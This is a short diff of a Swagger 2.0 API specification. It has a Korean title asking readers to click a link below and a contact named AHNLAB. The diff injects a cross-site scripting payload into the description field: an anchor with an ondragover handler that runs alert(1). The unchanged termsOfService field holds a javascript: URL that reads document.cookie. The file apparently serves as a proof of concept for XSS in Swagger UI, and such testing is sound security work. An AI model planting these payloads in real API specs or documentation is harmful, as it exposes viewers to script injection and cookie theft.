@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "아래 [페이지 이동] 링크를 클릭하세요",
-  "description": "<a href='https://www.google.com'><h2>[페이지 이동]</h2><img width='500px' src='https://miro.medium.com/max/1200/0*FhQ4QSLTlCqS2dmQ.png'/></a>",
+  "description": "<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here<h2>[페이지 이동]</h2><img width='500px' src='https://miro.medium.com/max/1200/0*FhQ4QSLTlCqS2dmQ.png'/></a>",
   "termsOfService": "javascript:alert(document.cookie)",
   "contact": 
   {"name": "AHNLAB",
